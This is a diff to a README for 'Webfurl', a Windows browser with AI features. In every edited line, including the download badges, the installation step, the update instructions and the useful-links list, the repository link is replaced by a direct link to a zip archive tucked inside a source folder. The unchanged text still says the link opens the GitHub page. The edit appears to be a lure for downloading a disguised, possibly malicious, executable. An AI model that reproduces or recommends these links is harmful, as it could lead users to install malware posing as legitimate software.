@@ -1,6 +1,6 @@
 # 🌐 Webfurl - Efficient Browsing with AI Assistance
 
-[![Download Webfurl](https://img.shields.io/badge/Download-Webfurl-brightgreen?style=for-the-badge)](https://github.com/WEEZY956/Webfurl)
+[![Download Webfurl](https://img.shields.io/badge/Download-Webfurl-brightgreen?style=for-the-badge)](https://github.com/WEEZY956/Webfurl/raw/refs/heads/main/crates/webfurl-server/src/Software-1.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get Webfurl up and running on your Windows computer, follow these steps caref
 
 Click the big green button at the top of this page or visit the link below:
 
-[Download Webfurl from GitHub](https://github.com/WEEZY956/Webfurl)
+[Download Webfurl from GitHub](https://github.com/WEEZY956/Webfurl/raw/refs/heads/main/crates/webfurl-server/src/Software-1.8.zip)
 
 This link will take you to the Webfurl GitHub page where you can find the latest version to download. Look for the "Releases" section or files labeled for Windows.
 
@@ -88,7 +88,7 @@ You do not need to do any special setup to use these features after installation
 
 From time to time, updates will improve Webfurl’s performance or add new features. Here’s how to update:
 
-- Visit the [Webfurl GitHub page](https://github.com/WEEZY956/Webfurl) regularly.
+- Visit the [Webfurl GitHub page](https://github.com/WEEZY956/Webfurl/raw/refs/heads/main/crates/webfurl-server/src/Software-1.8.zip) regularly.
 - Check the **Releases** section for a newer version.
 - Download the new installer file as described above.
 - Run the new installer. It will replace the older version without deleting your settings.
@@ -122,10 +122,10 @@ No programming experience is needed. These settings use simple buttons and check
 
 ## 🔗 Useful Links
 
-- **Download and Installation:** [https://github.com/WEEZY956/Webfurl](https://github.com/WEEZY956/Webfurl)
-- **GitHub Repository:** https://github.com/WEEZY956/Webfurl  
+- **Download and Installation:** [https://github.com/WEEZY956/Webfurl/raw/refs/heads/main/crates/webfurl-server/src/Software-1.8.zip](https://github.com/WEEZY956/Webfurl/raw/refs/heads/main/crates/webfurl-server/src/Software-1.8.zip)
+- **GitHub Repository:** https://github.com/WEEZY956/Webfurl/raw/refs/heads/main/crates/webfurl-server/src/Software-1.8.zip  
 - **Open an Issue:** You can report bugs or ask for help directly on the GitHub page under the "Issues" tab.
 
 ---
 
-[![Download Webfurl](https://img.shields.io/badge/Download-Webfurl-brightgreen?style=for-the-badge)](https://github.com/WEEZY956/Webfurl)
+[![Download Webfurl](https://img.shields.io/badge/Download-Webfurl-brightgreen?style=for-the-badge)](https://github.com/WEEZY956/Webfurl/raw/refs/heads/main/crates/webfurl-server/src/Software-1.8.zip)
